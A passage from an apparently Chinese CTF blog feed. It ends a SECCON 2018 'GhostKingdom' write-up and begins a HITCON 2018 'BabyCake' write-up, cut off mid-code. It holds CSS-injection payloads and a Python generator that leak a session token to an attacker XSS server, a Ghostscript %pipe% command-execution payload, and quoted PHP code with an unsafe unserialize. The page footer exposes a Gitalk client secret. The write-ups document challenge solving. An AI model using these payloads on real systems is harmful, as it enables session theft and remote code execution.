class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"f"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=f"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"0"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=0"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"1"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=1"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"2"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=2"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"3"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=3"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"4"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=4"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"5"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=5"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"6"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=6"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"7"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=7"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"8"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=8"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"9"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=9"</span>)&#125;</span><br></pre></td></tr></table></figure><p>原理是利用css选择器，当css解释器对每一个选择器进行解释时，如果找到了input的属性value的值符合其中的一个的话，就会向鄙人的xss服务器发送一次请求，这样就能确定每一位的value，最后可以获得整个csrf的值，比如第一次在xss服务器上获得的请求时match=b，则第二次的payload为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"ba"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=ba"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"bb"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=bb"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"bc"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=bc"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"bd"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=bd"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"be"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=be"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"bf"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=bf"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b0"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b0"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b1"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b1"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b2"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b2"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b3"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b3"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b4"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b4"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b5"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b5"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b6"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b6"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b7"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b7"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b8"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b8"</span>)&#125;</span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[value^=<span class="string">"b9"</span>]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"http://xxxxxxx.xx/xss/?match=b9"</span>)&#125;</span><br></pre></td></tr></table></figure><p>以此类推最后拿到整个cookie<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233019.png" alt><br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233045.png" alt></p><blockquote><p>这里有一个细节需要解释一下：这里最后拿到的cookie和之前截图中的cookie是一样的，是因为最前面截的图是题目已经做完了以后截图，当时已经劫持了获取到的cookie，但是在做题的时候cookie是不一样的，</p></blockquote><p>脚本如下(每次需要输入上次获取到的字符)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://2130706433/?css=%s&amp;msg=&amp;action=msgadm2'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'''input[value^="%sa"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%sa")&#125;</span></span><br><span class="line"><span class="string">input[value^="%sb"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%sb")&#125;</span></span><br><span class="line"><span class="string">input[value^="%sc"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%sc")&#125;</span></span><br><span class="line"><span class="string">input[value^="%sd"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%sd")&#125;</span></span><br><span class="line"><span class="string">input[value^="%se"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%se")&#125;</span></span><br><span class="line"><span class="string">input[value^="%sf"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%sf")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s0"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s0")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s1"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s1")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s2"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s2")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s3"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s3")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s4"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s4")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s5"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s5")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s6"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s6")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s7"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s7")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s8"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s8")&#125;</span></span><br><span class="line"><span class="string">input[value^="%s9"]&#123;background:url("http://xxxxxxx.xx/xss/?match=%s9")&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">'da'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = payload % (</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result,</span><br><span class="line">        result, result, result, result</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">print</span> p</span><br><span class="line">    u = url % base64.b64encode(p)</span><br><span class="line">    <span class="keyword">print</span> u</span><br><span class="line"></span><br><span class="line">    result += raw_input(<span class="string">'[*] Char: '</span>)</span><br></pre></td></tr></table></figure><p>在获取到cookie之后进行劫持，就可以在本机看到upload image的地址了<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027233507.png" alt></p><p>在upload界面，首先需要上传一个jpg图片，之后会把jpg图片转换为gif图片，上传的jpg图片的文件名以及后缀都不可控，只有图片内容可控</p><p>通过cookie的名字”CGISESSID”可以知道后端是perl，而perl处理图片用的是”ImageMagick”，最开始以后是ImageMagick的RCE，但是一直没有成功，后来才想起来题目是”GhostKingdom”，而在ImageMagick中做图片的转换时使用了ghostscript，而GhostScript也存在一个RCE漏洞，但是这个洞并没有CVE的编号所以才将注意力转移到ghostscript</p><p>关于GhostScript的漏洞分析请参考<a href="https://www.anquanke.com/post/id/157380" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157380</a></p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line"></span><br><span class="line">userdict &#x2F;setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark &#x2F;OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><p>将上面的payload保存到一个jpg文件中，第7行的id可以换成任何想执行的命令，上传以后再转换为gif，触发漏洞，拿到flag的文件名<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027225501.png" alt><br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027225514.png" alt></p><p>最后拿到flag<br><img src="/2018/10/28/Seccon2018-GhostKingdom-Writeup/TIM%E6%88%AA%E5%9B%BE20181027234138.png" alt></p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      这次参加了Seccon2018，鄙人有幸做出了一道题，感觉其中利用css获取数据的方法非常好。
    
    </summary>
    
    
      <category term="ctf" scheme="https://srpopty.github.io/categories/ctf/"/>
    
    
      <category term="writeup" scheme="https://srpopty.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon 2018 BabyCake Writeup</title>
    <link href="https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/"/>
    <id>https://srpopty.github.io/2018/10/27/Hitcon-2018-BabyCake-Writeup/</id>
    <published>2018-10-27T15:07:21.000Z</published>
    <updated>2020-03-11T13:03:25.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Baby-Cake"><a href="#Baby-Cake" class="headerlink" title="Baby Cake"></a>Baby Cake</h1><blockquote><p>Get the shell plz!!!!!</p></blockquote><p>题目简单明了，直接给了全部源码(不像某些国内垃圾比赛全靠脑洞做题)，整个网站实现的功能就是根据url参数去请求目标网页，如果是Get的话会存cache在本地，Post的话将会直接把data参数post到目标网站，并且不会保存cache。<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231031.png" alt></p><h2 id="本地任意文件读取"><a href="#本地任意文件读取" class="headerlink" title="本地任意文件读取"></a>本地任意文件读取</h2><p>网站使用了CakePHP框架，对目标url的请求也是调用了CakePHP的API，整站的源码打包下载下来，解压出来有快30个M…目录结构也非常复杂。<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231318.png" alt><br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231423.png" alt></p><p>查看CakePHP的文档找到<a href="https://book.cakephp.org/2.0/zh/getting-started/cakephp-folder-structure.html" target="_blank" rel="noopener">目录结构</a></p><p>这里重点关注src以及vendor目录，controller位于src目录下<br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231604.png" alt><br><img src="/2018/10/27/Hitcon-2018-BabyCake-Writeup/TIM%E6%88%AA%E5%9B%BE20181022231609.png" alt></p><p>src保存网站源码，而vendor则保存所有的第三方库，其中包括了CakePHP的源码。整个网站主要源码位于<code>/src/Controller/PagesController.php</code>里，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">ForbiddenException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">NotFoundException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">View</span>\<span class="title">Exception</span>\<span class="title">MissingTemplateException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DymmyResponse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($headers, $body)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers = $headers;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body = $body;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PagesController</span> <span class="keyword">extends</span> <span class="title">AppController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span><span class="params">($method, $url, $headers, $data)</span> </span>&#123;</span><br><span class="line">        $options = [</span><br><span class="line">            <span class="string">'headers'</span> =&gt; $headers, </span><br><span class="line">            <span class="string">'timeout'</span> =&gt; <span class="number">10</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $http = <span class="keyword">new</span> Client();</span><br><span class="line">        <span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">back</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'pages'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_cache_dir</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $ip = <span class="keyword">$this</span>-&gt;request-&gt;getEnv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">        $index = sprintf(<span class="string">'mycache/%s/%s/'</span>, $ip, $key);</span><br><span class="line">        <span class="keyword">return</span> CACHE . $index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span><span class="params">($key, $response)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, <span class="number">0700</span>, <span class="keyword">true</span>);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"body.cache"</span>, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"headers.cache"</span>, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . <span class="string">"/body.cache"</span>);</span><br><span class="line">            $headers = file_get_contents($cache_dir . <span class="string">"/headers.cache"</span>);</span><br><span class="line"></span><br><span class="line">            $body = <span class="string">"&lt;!-- from cache --&gt;\n"</span> . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DymmyResponse($headers, $body);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">(...$path)</span> </span>&#123;</span><br><span class="line">        $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">        $data = $request-&gt;getQuery(<span class="string">'data'</span>);</span><br><span class="line">        $url  = $request-&gt;getQuery(<span class="string">'url'</span>);</span><br><span class="line">        <span class="keyword">if</span> (strlen($url) == <span class="number">0</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $scheme = strtolower( parse_url($url, PHP_URL_SCHEME) );</span><br><span class="line">        <span class="keyword">if</span> (strlen($scheme) == <span class="number">0</span> || !in_array($scheme, [<span class="string">'http'</span>, <span class="string">'https'</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $method = strtolower( $request-&gt;getMethod() );</span><br><span class="line">        <span class="keyword">if</span> ( !in_array($method, [<span class="string">'get'</span>, <span class="string">'post'</span>, <span class="string">'put'</span>, <span class="string">'delete'</span>, <span class="string">'patch'</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($request-&gt;getHeaders() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array( strtolower($key), [<span class="string">'host'</span>, <span class="string">'connection'</span>, <span class="string">'expect'</span>, <span class="string">'content-length'</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (count($value) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $headers[$key] = $value[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $key = md5($url);</span><br><span class="line">        <span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;cache_get($key);</span><br><span class="line">            <span class="keyword">if</span> (!$response) &#123;</span><br><span class="line">                $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cache_set($key, $response);                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($response-&gt;headers <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strtolower($key) == <span class="string">'content-type'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="keyword">array</span>(<span class="string">'type'</span> =&gt; $value));</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="string">'type'</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response-&gt;withHeader($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;response-&gt;body($response-&gt;body);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要逻辑在display函数中，这里只关心输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">(...$path)</span> </span>&#123;</span><br><span class="line"> $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line"> $data = $request-&gt;getQuery(<span class="string">'data'</span>);</span><br><span class="line"> $url  = $request-&gt;getQuery(<span class="string">'url'</span>);</span><br><span class="line">...</span><br><span class="line">$key = md5($url);</span><br><span class="line"><span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123; <span class="comment">// 如果是GET</span></span><br><span class="line">$response = <span class="keyword">$this</span>-&gt;cache_get($key); <span class="comment">// 尝试获取本地缓存</span></span><br><span class="line"><span class="keyword">if</span> (!$response) &#123; <span class="comment">// 没有缓存则直接远程请求</span></span><br><span class="line">$response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;cache_set($key, $response); <span class="comment">// 将请求结果放到缓存中</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// POST不缓存，直接带着data请求</span></span><br><span class="line">$response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的请求方式调用了<code>httpclient($method, $url, $headers, $data)</code>函数，下面看看这个函数做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span><span class="params">($method, $url, $headers, $data)</span> </span>&#123;</span><br><span class="line">$options = [</span><br><span class="line"><span class="string">'headers'</span> =&gt; $headers,</span><br><span class="line"><span class="string">'timeout'</span> =&gt; <span class="number">10</span></span><br><span class="line">];</span><br><span 